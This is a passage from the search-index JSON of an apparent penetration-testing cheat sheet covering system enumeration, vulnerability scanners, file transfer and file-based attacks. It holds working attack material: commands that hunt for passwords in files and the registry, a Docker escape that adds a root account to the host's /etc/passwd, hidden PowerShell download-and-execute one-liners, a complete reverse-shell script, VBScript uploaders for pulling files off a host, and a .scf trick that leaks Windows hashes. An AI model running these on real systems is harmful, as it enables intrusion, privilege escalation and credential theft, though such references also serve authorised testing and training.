/etc/ld.so.conf.d/ ls -lah /etc/ld.so.conf.d/ . | Follow this if ld.so.conf can be modified | Check udev rules:ls -lah /etc/udev/rules.d ls -lahd /etc/udev/rules.d . | List disk/partitions:ls /dev ls /dev/mapper # List partitions fdisk -l /dev/sda blkid /dev/sda cat /proc/partitions # Mounted mount cat /etc/mtab cat /etc/fstab cat /proc/mounts # Swap swapon cat /proc/swaps . | Mount partitions:# Requires root mount /dev/sda2 &lt;path&gt; # Doesn't require udisksctl mount -b /dev/sda2 &lt;path&gt; . | Host and Domain identification:# hostname hostname # Long hostname hostname -f # IPs for the hostname hostname -i # NIS/YP Domain hostname -y domainname nisdomainname ypdomainname # DNS domain hostname -d dnsdomainname . | Get the interfaces:# Modern systems ip addr # Not so modern ifconfig # Old systems netstat -ie . | Check the routing table:# Modern systems ip route # Not so modern route # Old systems netstat -r . | Check the DNSs:cat /etc/resolv.conf . | Check the hosts:cat /etc/hosts . | Check the ARP table:arp # BSD format arp -a # Numeric output arp -n . | Check the sockets:# Modern systems ss -tulnp # Old systems netstat -anop . | Check the firewall rules:iptables --list # Modern systems may use nftables . | List running processes:ps aux | less # ps w in some systems . | List drivers:lsmod less /proc/modules . | CPU and memory info:less /proc/cpuinfo less /proc/meminfo # Stats cat /proc/uptime less /proc/stat less /proc/vmstat less /proc/misc . | . ",
    "url": "http://localhost:4000/#system-enumeration--linux",
    "relUrl": "/#system-enumeration--linux"
  },"390": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#system-enumeration--windows",
    "relUrl": "/#system-enumeration--windows"
  },"391": {
    "doc": "ftf-hacksheet",
    "title": "cmd.exe",
    "content": ". | List environment variables:echo %USERNAME% echo %USERDOMAIN% echo %USERPROFILE% echo %PATH% :: Temporarily modify it set PATH=%PATH%;C:\\&lt;path&gt; :: Set it permanently (yes, no =) setx PATH %PATH%;C:\\&lt;path&gt; . | Check if custom installation::: Both should be the same echo %SystemRoot% echo %WinDir% :: SystemRoot isn't defined in pre-NT . | Find all users / user info::: List all users net user :: List extended user info net user &lt;username&gt; :: Pay attention to the Local and Global Group memberships :: Enumerate all domain users net user /domain :: List current account details net accounts . | List current user and hostname::: May not be installed whoami hostname . | List current user privileges:whoami /priv . | List OS and version:systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" :: Alternatively try: msinfo32 :: Note: msinfo32 may not be in PATH . | List patches:wmic qfe get Caption,Description,HotFixID,InstalledOn . | List .NET versions::: Useful for compiling C# exploits dir /a:D \"C:\\WINDOWS\\Microsoft.NET\\Framework\" :: Or query the registry reg query \"HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\" . | List PowerShell versions and paths::: Try with different numbers reg query HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine /v PowerShellVersion reg query HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine /v ApplicationBase :: Custom PSs reg query HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /v Path :: ^ Also check for ExecutionPolicy . | Find files/directories:cd C:\\ :: Show hidden and non-hidden content dir /a :: List all recursively dir /s /a :: Locate .txt files in the system dir /s *.txt :: Locate .bak files in the system dir /s *.bak :: List non-hidden recursively dir /s :: Hidden content only dir /ah :: Hidden content recursively dir /ah /s :: Both hidden/non-hidden - simple for /f \"tokens=*\" %i in ('dir /b/a:-d') do echo \"%i\" . | Check folder permissions (icacls)::: WD: Write Perm | AD: Create Dir icacls &lt;dir&gt; :: R: Read | X: Execute | I: Inherit . | List possible passwords/credentials::: Files dir /s /a *pass* == *cred* == *vnc* == *.config* findstr /si password *.xml *.ini *.txt :: Registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s . | PowerShell history:type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt . | Show the content/concat file(s):type &lt;file&gt; . | List, mount, unmount disk volumes::: List all volumes mountvol :: Mount volume in D: mountvol D:\\ \\\\?\\Volume{&lt;guid&gt;}\\ :: Unmount D: mountvol D:\\ /D . | Find the type of a volume (CD-ROM)::: Do this to find why cd D:\\ returns :: &gt; The device is not ready diskpart list disk select disk 0 list partition select partition 1 list volume :: Check the type, FS... :: CD/DVD-ROM without a disk won't :: allow accessing it, thus the error . | Disk repair tools (to then mount):chkdsk :: Add the /f flag to perform fixes sfc /scannow :: Windows File Protecton fixer . | Mount shares::: Map the share net use \\\\&lt;ip&gt;\\&lt;path&gt; :: Map the share to a label net use E: \\\\&lt;ip&gt;\\&lt;path&gt; :: Or mount the share to a folder mklink /d C:\\&lt;path&gt; \\\\&lt;ip&gt;\\&lt;path&gt; . | List all interfaces:ipconfig /all . | List routing table:route print . | List ARP tables:arp -a arp -A . | List all connections, state + pid:netstat -ano :: Show only TCP netstat -anop TCP . | List firewall stated and configuration:netsh firewall show state netsh firewall show config . | List firewall adv profile and rules:netsh advfirewall show currentprofile netsh advfirewall firewall show rule name=all . | List scheduled tasks:schtasks /query /fo LIST /v :: A modified version exists for :: Win2K as well as JT.EXE . | List running processes::: All running processes tasklist /SVC :: Process by match tasklist /FI \"IMAGENAME eq &lt;process&gt;\" . | List drivers and filter::: List not found in C:\\WINDOWS driverquery /v | findstr /i /v \"C:\\WINDOWS\" :: List only executed at boot driverquery /v | findstr /i \"boot\" :: List only running drivers driverquery /v | findstr /i \"running\" . | List services and their permissions:wmic service list brief :: Using sc sc query sc qc &lt;service-name&gt; . | AccessChk multiple system permissions::: Accept terms accesschk.exe /accepteula :: Service permissions accesschk.exe -ucqv * accesschk.exe -ucqv &lt;service-name&gt; accesschk.exe -uwcqv \"Authenticated Users\" * :: Folders with weak permissions accesschk.exe -uwdqs Users C:\\ accesschk.exe -uwdqs \"Authenticated Users\" C:\\ :: Files with weak permissions accesschk.exe -uwqs Users C:\\*.* accesschk.exe -uwqs \"Authenticated Users\" C:\\*.* . | . ",
    "url": "http://localhost:4000/#system-enumeration--windows--cmd-exe",
    "relUrl": "/#system-enumeration--windows--cmd-exe"
  },"392": {
    "doc": "ftf-hacksheet",
    "title": "PowerShell",
    "content": ". | Check for current PS path:(Get-Process -Id $pid).Path . | Check for default PS:(Get-Command PowerShell.exe).Path :: Newer Windows (Get-Command -Name pwsh).Path . | Check for current version::: PS 2.0 and up $PSVersionTable.PSVersion.ToString() :: PS 1.0 $host.Version . | Check if running 64 bit PS::: Pointers are 8 bytes on x64 PS [System.IntPtr]::Size -eq 8 :: Using the environment [Environment]::Is64BitProcess . | Run a specific version:powershell -version 2 . | Check for a specific version:Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 :: Windows Server Get-WindowsFeature PowerShell-V2 . | Path list: . | Windows 64 bit:%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe :: From 32 bit session %SystemRoot%\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe . | Windows 32 bit:%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe :: Also try %WinDir% :: From 64 bit session %SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe . | . | . ",
    "url": "http://localhost:4000/#system-enumeration--windows--powershell",
    "relUrl": "/#system-enumeration--windows--powershell"
  },"393": {
    "doc": "ftf-hacksheet",
    "title": "Docker",
    "content": ". | List the images:docker images . | Check the history of an image:docker history --no-trunc &lt;img-hash&gt; . | Run an interactive shell in the image:docker run -it --entrypoint=/bin/sh &lt;img-hash&gt; . | Mount the host&#8217;s filesystem and access it through docker:cd / docker run -it -v $PWD:/mnt --entrypoint=/bin/sh &lt;img-hash&gt; # If you are root in Docker you'll be # able to access the host filesystem # also as root under /mnt echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' &gt;&gt; /mnt/etc/passwd # Now you'll be able to su toor with # password: password on the host . | If you don&#8217;t have any image available (or those available are restricted) you can use a socks tunnel to obtain a vulnerable one | . ",
    "url": "http://localhost:4000/#system-enumeration--docker",
    "relUrl": "/#system-enumeration--docker"
  },"394": {
    "doc": "ftf-hacksheet",
    "title": "System Monitoring",
    "content": " ",
    "url": "http://localhost:4000/#system-monitoring",
    "relUrl": "/#system-monitoring"
  },"395": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": " ",
    "url": "http://localhost:4000/#system-monitoring--linux",
    "relUrl": "/#system-monitoring--linux"
  },"396": {
    "doc": "ftf-hacksheet",
    "title": "pspy",
    "content": ". | Site - profs unprivileged info snoop:# -pf - Commands and System Events pspy -pf -i 1000 # -i &lt;ms&gt; - Scan procfs every 1000ms # -r &lt;dir&gt; - Recursive dir watch # -d &lt;dir&gt; - Non-recursive dir watch . | . ",
    "url": "http://localhost:4000/#system-monitoring--linux--pspy",
    "relUrl": "/#system-monitoring--linux--pspy"
  },"397": {
    "doc": "ftf-hacksheet",
    "title": "System Vulnerability Enumeration",
    "content": " ",
    "url": "http://localhost:4000/#system-vulnerability-enumeration",
    "relUrl": "/#system-vulnerability-enumeration"
  },"398": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#system-vulnerability-enumeration--windows",
    "relUrl": "/#system-vulnerability-enumeration--windows"
  },"399": {
    "doc": "ftf-hacksheet",
    "title": "Generic",
    "content": " ",
    "url": "http://localhost:4000/#system-vulnerability-enumeration--windows--generic",
    "relUrl": "/#system-vulnerability-enumeration--windows--generic"
  },"400": {
    "doc": "ftf-hacksheet",
    "title": "winPEAS",
    "content": ". | winPEASexe - .NET &gt;= 4.5 (Watson incl) | winPEASbat - toggle the long variable | . ",
    "url": "http://localhost:4000/#system-vulnerability-enumeration--windows--generic--winpeas",
    "relUrl": "/#system-vulnerability-enumeration--windows--generic--winpeas"
  },"401": {
    "doc": "ftf-hacksheet",
    "title": "Windows-Exploit-Suggester",
    "content": ". | Site - unsupported xlsx fix# Obtain the latest database windows-exploit-suggester.py --update # Suggest based on systeminfo output windows-exploit-suggester.py --database &lt;database&gt; --systeminfo &lt;file-with-systeminfo-output&gt; . | . ",
    "url": "http://localhost:4000/#system-vulnerability-enumeration--windows--generic--windows-exploit-suggester",
    "relUrl": "/#system-vulnerability-enumeration--windows--generic--windows-exploit-suggester"
  },"402": {
    "doc": "ftf-hacksheet",
    "title": "Kernel",
    "content": " ",
    "url": "http://localhost:4000/#system-vulnerability-enumeration--windows--kernel",
    "relUrl": "/#system-vulnerability-enumeration--windows--kernel"
  },"403": {
    "doc": "ftf-hacksheet",
    "title": "Sherlock",
    "content": ". | PowerShell x86/x64 | Download | Usage::: Use the appropriate PS (x86/x64) powershell.exe -Exec Bypass -nop -w Hidden -NoLogo -NonInteractive -Command \"IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;/Sherlock.ps1'); Find-AllVulns\" . | . ",
    "url": "http://localhost:4000/#system-vulnerability-enumeration--windows--kernel--sherlock",
    "relUrl": "/#system-vulnerability-enumeration--windows--kernel--sherlock"
  },"404": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": " ",
    "url": "http://localhost:4000/#system-vulnerability-enumeration--linux",
    "relUrl": "/#system-vulnerability-enumeration--linux"
  },"405": {
    "doc": "ftf-hacksheet",
    "title": "Generic",
    "content": " ",
    "url": "http://localhost:4000/#system-vulnerability-enumeration--linux--generic",
    "relUrl": "/#system-vulnerability-enumeration--linux--generic"
  },"406": {
    "doc": "ftf-hacksheet",
    "title": "linPEAS",
    "content": ". | linPEAS.sh - Run with -a, use -P &lt;pwd&gt; | . ",
    "url": "http://localhost:4000/#system-vulnerability-enumeration--linux--generic--linpeas",
    "relUrl": "/#system-vulnerability-enumeration--linux--generic--linpeas"
  },"407": {
    "doc": "ftf-hacksheet",
    "title": "Folders Enumeration",
    "content": " ",
    "url": "http://localhost:4000/#folders-enumeration",
    "relUrl": "/#folders-enumeration"
  },"408": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": "C:\\Program Files C:\\WINDOWS\\Debug :: Logs from Apps C:\\WINDOWS\\system32\\LogFiles :: SAM &amp; System - Check .bak C:\\WINDOWS\\system32\\config :: Memory dumps C:\\WINDOWS\\MEMORY.DMP :: Nothing special C:\\WINDOWS\\system32\\ReinstallBackups :: Search *.log *.bak C:\\WINDOWS\\ . ",
    "url": "http://localhost:4000/#folders-enumeration--windows",
    "relUrl": "/#folders-enumeration--windows"
  },"409": {
    "doc": "ftf-hacksheet",
    "title": "File",
    "content": " ",
    "url": "http://localhost:4000/#file",
    "relUrl": "/#file"
  },"410": {
    "doc": "ftf-hacksheet",
    "title": "Transfer",
    "content": " ",
    "url": "http://localhost:4000/#file--transfer",
    "relUrl": "/#file--transfer"
  },"411": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#file--transfer--windows",
    "relUrl": "/#file--transfer--windows"
  },"412": {
    "doc": "ftf-hacksheet",
    "title": "Download",
    "content": " ",
    "url": "http://localhost:4000/#file--transfer--windows--download",
    "relUrl": "/#file--transfer--windows--download"
  },"413": {
    "doc": "ftf-hacksheet",
    "title": "cmd.exe",
    "content": ". | VBScript to download binary files (type 1 -&gt; bin; type 2 -&gt; text but it looks like 2 doesn&#8217;t work and 1 also works with text) using ADO DB, run it with cscript //B //T:180 //Nologo wget.vbs &quot;http://&lt;ip-port&gt;/&lt;remote-file&gt;&quot; &quot;&lt;name&gt;&quot;:echo Dim strURL, StrFile &gt; wget.vbs echo strUrl = WScript.Arguments.Item(0) &gt;&gt; wget.vbs echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs echo Dim http, bytes &gt;&gt; wget.vbs echo Err.Clear &gt;&gt; wget.vbs echo Set http = Nothing &gt;&gt; wget.vbs echo Set http = WScript.CreateObject(\"WinHttp.WinHttpRequest.5.1\") &gt;&gt; wget.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"WinHttp.WinHttpRequest\") &gt;&gt; wget.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"MSXML2.ServerXMLHTTP\") &gt;&gt; wget.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"Microsoft.XMLHTTP\") &gt;&gt; wget.vbs echo WScript.Echo \"Downloading \" ^&amp; StrFile &gt;&gt; wget.vbs echo http.Open \"GET\", strURL, False &gt;&gt; wget.vbs echo http.Send &gt;&gt; wget.vbs echo bytes = http.ResponseBody &gt;&gt; wget.vbs echo Set http = Nothing &gt;&gt; wget.vbs echo With WScript.CreateObject(\"ADODB.Stream\") &gt;&gt; wget.vbs echo .Open &gt;&gt; wget.vbs echo .type = 1 &gt;&gt; wget.vbs echo .Write bytes &gt;&gt; wget.vbs echo .SaveToFile StrFile, 2 &gt;&gt; wget.vbs echo End With &gt;&gt; wget.vbs echo WScript.Echo \"Done\" &gt;&gt; wget.vbs . | Alternate script in case ADO DB is not installed using the trick described here, note that it is unreliable and may take a long time to write files:echo Dim strURL, StrFile &gt; wget.vbs echo strUrl = WScript.Arguments.Item(0) &gt;&gt; wget.vbs echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs echo Err.Clear &gt;&gt; wget.vbs echo Set http = Nothing &gt;&gt; wget.vbs echo Set http = WScript.CreateObject(\"WinHttp.WinHttpRequest.5.1\") &gt;&gt; wget.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"WinHttp.WinHttpRequest\") &gt;&gt; wget.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"MSXML2.ServerXMLHTTP\") &gt;&gt; wget.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"Microsoft.XMLHTTP\") &gt;&gt; wget.vbs echo http.Open \"GET\", strURL, False &gt;&gt; wget.vbs echo http.Send &gt;&gt; wget.vbs echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs echo Set http = Nothing &gt;&gt; wget.vbs echo Set fs = WScript.CreateObject(\"Scripting.FileSystemObject\") &gt;&gt; wget.vbs echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs echo strData = \"\" &gt;&gt; wget.vbs echo strBuffer = \"\" &gt;&gt; wget.vbs echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs echo Next &gt;&gt; wget.vbs echo ts.Close &gt;&gt; wget.vbs . | . ",
    "url": "http://localhost:4000/#file--transfer--windows--download--cmd-exe",
    "relUrl": "/#file--transfer--windows--download--cmd-exe"
  },"414": {
    "doc": "ftf-hacksheet",
    "title": "PowerShell",
    "content": ". | Using System.Net.WebClient:: Download file powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;ip&gt;/evil.exe', 'evil.exe') :: Download and execute remote PS1 powershell IEX (New-Object Net.WebClient).DownloadString(\"http://&lt;ip&gt;/shell.ps1\"); :: shell.ps1 $client = New-Object System.Net.Sockets.TCPClient(\"&lt;ip&gt;\",&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"# \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() . | . ",
    "url": "http://localhost:4000/#file--transfer--windows--download--powershell",
    "relUrl": "/#file--transfer--windows--download--powershell"
  },"415": {
    "doc": "ftf-hacksheet",
    "title": "SMB",
    "content": ". | Check the Impacket&gt;SMBserver section | . ",
    "url": "http://localhost:4000/#file--transfer--windows--download--smb",
    "relUrl": "/#file--transfer--windows--download--smb"
  },"416": {
    "doc": "ftf-hacksheet",
    "title": "Upload",
    "content": " ",
    "url": "http://localhost:4000/#file--transfer--windows--upload",
    "relUrl": "/#file--transfer--windows--upload"
  },"417": {
    "doc": "ftf-hacksheet",
    "title": "Servers",
    "content": ". | Apache-PHP local server for uploads: /var/www/html/upload.php (don&#8217;t forget to set the upload folder to www-data owner), note that the PHP built-in web server also parses PHP, so maybe this file also works:&lt;?php $uploaddir = '/var/www/uploads/'; $uploadfile = $uploaddir . $_FILES['file']['name']; move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?&gt; . | Socat local server for the VBS:socat TCP-LISTEN:8081,reuseaddr,fork SYSTEM:'file=\"$(eval printf \"$(sed -u \"s,^POST /\\\\+\\\\|\\\\.\\\\+/\\\\| HTTP[^ ]*$,,g;s,/\\\\+,/,g;s/%\\\\([0-9]\\\\+\\\\)/\\\\$(printf \\\\\"\\\\\\\\\\\\%03o\\\\\" \\\\$((0x\\\\1)))/g;q\")\")\"; length=$(sed -nu \"s,^Content-Length:\\\\s*\\\\([0-9]\\\\+\\\\).*,\\\\1,gp;/^\\\\s*$/q\"); echo \"[$(date \"+%F %T\")] Receiving $file - size $(numfmt --to=iec-i --suffix=B $length)\" &gt;&amp;2; eval \"dd ibs=1 count=$length of=\\\\\\\"$file\\\\\\\" status=none\"; printf \"\\\\r\\\\n\"' . | . ",
    "url": "http://localhost:4000/#file--transfer--windows--upload--servers",
    "relUrl": "/#file--transfer--windows--upload--servers"
  },"418": {
    "doc": "ftf-hacksheet",
    "title": "cmd.exe",
    "content": ". | Adapted VBScript from this, note that type 1 is binary and 2 text, use it as cscript //B //T:180 //Nologo upload.vbs &quot;http://&lt;ip-port&gt;/&lt;remote-name&gt;&quot; &quot;&lt;file&gt;&quot; (quote the parameters to include spaces); upload all files in a directory with for %f in (.\\*) do @cscript...%f &quot;%f&quot; (for /R %f for recursion), hidden files with for /f &quot;tokens=*&quot; %f in (&#39;dir /b/a:-d&#39;) do @cscript...: | . - . echo Dim strURL, strFile, dataFile, dataRequest &gt; upload.vbs echo strUrl = WScript.Arguments.Item(0) &gt;&gt; upload.vbs echo strFile = WScript.Arguments.Item(1) &gt;&gt; upload.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; upload.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; upload.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; upload.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; upload.vbs echo Err.Clear &gt;&gt; upload.vbs echo Set http = Nothing &gt;&gt; upload.vbs echo Set http = WScript.CreateObject(\"Microsoft.XMLHTTP\") &gt;&gt; upload.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"WinHttp.WinHttpRequest\") &gt;&gt; upload.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"MSXML2.ServerXMLHTTP\") &gt;&gt; upload.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"Microsoft.XMLHTTP\") &gt;&gt; upload.vbs echo WScript.Echo \"Uploading \" ^&amp; strFile &gt;&gt; upload.vbs echo With WScript.CreateObject(\"ADODB.Stream\") &gt;&gt; upload.vbs echo .Open &gt;&gt; upload.vbs echo .type = 1 &gt;&gt; upload.vbs echo .LoadFromFile(strFile) &gt;&gt; upload.vbs echo dataFile = .Read() &gt;&gt; upload.vbs echo End With &gt;&gt; upload.vbs echo dataRequest = dataFile &gt;&gt; upload.vbs echo http.open \"POST\", strURL, False &gt;&gt; upload.vbs echo http.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\" &gt;&gt; upload.vbs echo http.setRequestHeader \"Content-Length\", Len(dataRequest) &gt;&gt; upload.vbs echo http.send dataRequest &gt;&gt; upload.vbs echo WScript.Echo \"Done\" &gt;&gt; upload.vbs echo Set http = Nothing &gt;&gt; upload.vbs . | Convert the &#8220;binary&#8221; text files to &#8220;text&#8221; with iconv and chardetect (pip install chardet) - reference:# Detect the charset file -i &lt;text-file-in-binary&gt; # Or, alternatively: chardet &lt;text-file-in-binary&gt; # Check if it is BE or LE: # -&gt; LE if the odd colums are 000 od An -bc &lt;text-file-in-binary&gt; | less # Convert it with GNU strings: # Add -w if missing tabs/newlines strings -ael &lt;text-file-in-binary&gt; &gt; &lt;converted&gt; # Using POSIX iconv: # List all iconv encodings iconv -l # Convert it to UTF-8 iconv -f UTF-16LE// -t UTF-8// &lt; &lt;text-file-in-binary&gt; &gt; &lt;converted&gt; # Check the type again: file -i &lt;text-file-in-binary&gt; # Filter it if is still not correct: strings -w &lt;converted&gt; &gt; &lt;clean&gt; . | This is an alternative in case ADO DB is not installed, but only works reliable with non-binary files, though you may try this workaround:echo Dim strURL, strFile, dataFile, dataRequest &gt; upload.vbs echo strUrl = WScript.Arguments.Item(0) &gt;&gt; upload.vbs echo strFile = WScript.Arguments.Item(1) &gt;&gt; upload.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; upload.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; upload.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; upload.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; upload.vbs echo Dim http, fs, of &gt;&gt; upload.vbs echo Err.Clear &gt;&gt; upload.vbs echo Set http = Nothing &gt;&gt; upload.vbs echo Set http = WScript.CreateObject(\"Microsoft.XMLHTTP\") &gt;&gt; upload.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"WinHttp.WinHttpRequest\") &gt;&gt; upload.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"MSXML2.ServerXMLHTTP\") &gt;&gt; upload.vbs echo If http Is Nothing Then Set http = WScript.CreateObject(\"Microsoft.XMLHTTP\") &gt;&gt; upload.vbs echo WScript.Echo \"Uploading \" &amp; strFile &gt;&gt; upload.vbs echo Set fs = WScript.CreateObject(\"Scripting.FileSystemObject\") &gt;&gt; upload.vbs echo Set of = fs.GetFile(strFile) &gt;&gt; upload.vbs echo With of.OpenAsTextStream() &gt;&gt; upload.vbs echo dataFile = .Read(of.Size) &gt;&gt; upload.vbs echo .Close &gt;&gt; upload.vbs echo End With &gt;&gt; upload.vbs echo dataRequest = dataFile &gt;&gt; upload.vbs echo http.open \"POST\", strURL, False &gt;&gt; upload.vbs echo http.setRequestHeader \"Content-Type\", \"application/x-www-form-urlencoded\" &gt;&gt; upload.vbs echo http.setRequestHeader \"Content-Length\", Len(dataRequest) &gt;&gt; upload.vbs echo http.send dataRequest &gt;&gt; upload.vbs echo WScript.Echo \"Done\" &gt;&gt; upload.vbs echo Set http = Nothing &gt;&gt; upload.vbs . | . ",
    "url": "http://localhost:4000/#file--transfer--windows--upload--cmd-exe",
    "relUrl": "/#file--transfer--windows--upload--cmd-exe"
  },"419": {
    "doc": "ftf-hacksheet",
    "title": "PowerShell",
    "content": ". | Using System.Net.WebClient to perform an HTTP POST:powershell (New-Object System.Net.WebClient).UploadFile('http://&lt;ip&gt;/upload.php', '&lt;file&gt;.docx') . | . ",
    "url": "http://localhost:4000/#file--transfer--windows--upload--powershell",
    "relUrl": "/#file--transfer--windows--upload--powershell"
  },"420": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": " ",
    "url": "http://localhost:4000/#file--transfer--linux",
    "relUrl": "/#file--transfer--linux"
  },"421": {
    "doc": "ftf-hacksheet",
    "title": "Perl File::Fetch",
    "content": ". | HTTP only (and file, FTP, rsync &amp; git):# Might not support redirects (iosock) perl -mFile::Fetch -le 'File::Fetch-&gt;new(uri=&gt;\"&lt;url&gt;\")-&gt;fetch(to=&gt;\\$_) or die;print' # For FTP some changes may be required . | . ",
    "url": "http://localhost:4000/#file--transfer--linux--perl-file--fetch",
    "relUrl": "/#file--transfer--linux--perl-file--fetch"
  },"422": {
    "doc": "ftf-hacksheet",
    "title": "Attack",
    "content": " ",
    "url": "http://localhost:4000/#file--attack",
    "relUrl": "/#file--attack"
  },"423": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#file--attack--windows",
    "relUrl": "/#file--attack--windows"
  },"424": {
    "doc": "ftf-hacksheet",
    "title": "SCF File Attack",
    "content": ". | Shell Command Files (.scf) can be used to send a victim&#8217;s hashes to an attacker listening with responder | Send .@evil.scf to the victim:[Shell] Command=2 IconFile=\\\\&lt;ip&gt;\\share\\test.ico [Taskbar] Command=ToggleDesktop . | The .@ symbols are used to hide it and give it top execution priority | When the victim access the folder with the .scf file, the attacker will receive a connection with the hashes | . ",
    "url": "http://localhost:4000/#file--attack--windows--scf-file-attack",
    "relUrl": "/#file--attack--windows--scf-file-attack"
  },"425": {
    "doc": "ftf-hacksheet",
    "title": "Compression / Archive",
    "content": " ",
    "url": "http://localhost:4000/#file--compression---archive",
    "relUrl": "/#file--compression---archive"
  },"426": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#file--compression---archive--windows",
    "relUrl": "/#file--compression---archive--windows"
  },"427": {
    "doc": "ftf-hacksheet",
    "title": "Troubleshooting",
    "content": ". | Some Windows versions and user accounts (such as Administrator) may behave unreliably due to the CopyHere function | Remove the //B parameter to see the error | CopyHere codes vary: older - old - new | Try using as last parameter 4 (no copy dialog), 16 (answer yes to all), 1024 (no dialog if error) or False | Note that using nothing (or 0) may hang the script as it prompts something in the UI and waits for the user interaction | Also try appending a trailing backslash to the directory (and zip) path | Ultimately try with a non-SYSTEM shell | . ",
    "url": "http://localhost:4000/#file--compression---archive--windows--troubleshooting",
    "relUrl": "/#file--compression---archive--windows--troubleshooting"
  },"428": {
    "doc": "ftf-hacksheet",
    "title": "Unzip",
    "content": ". | VBScript to be run with cscript //B //T:180 //Nologo unzip.vbs &quot;&lt;orig.zip&gt;&quot; &quot;&lt;dest-dir&gt;&quot;, inspired by this:echo Dim fso, strZip, strDir, objShell, filesInZip &gt; unzip.vbs echo Set fso = WScript.CreateObject(\"Scripting.FileSystemObject\") &gt;&gt; unzip.vbs echo strZip = fso.GetAbsolutePathName(WScript.Arguments.Item(0)) &gt;&gt; unzip.vbs echo strDir = fso.GetAbsolutePathName(WScript.Arguments.Item(1)) &gt;&gt; unzip.vbs echo WScript.Echo \"Unzipping \" ^&amp; strZip ^&amp; \" into \" ^&amp; strDir &gt;&gt; unzip.vbs echo If NOT fso.FolderExists(strDir) Then &gt;&gt; unzip.vbs echo fso.CreateFolder(strDir) &gt;&gt; unzip.vbs echo End If &gt;&gt; unzip.vbs echo Set fso = Nothing &gt;&gt; unzip.vbs echo Set objShell = WScript.CreateObject(\"Shell.Application\") &gt;&gt; unzip.vbs echo Set filesInZip = objShell.NameSpace(strZip).Items &gt;&gt; unzip.vbs echo objShell.NameSpace(strDir).CopyHere(filesInZip), 4 + 16 + 1024 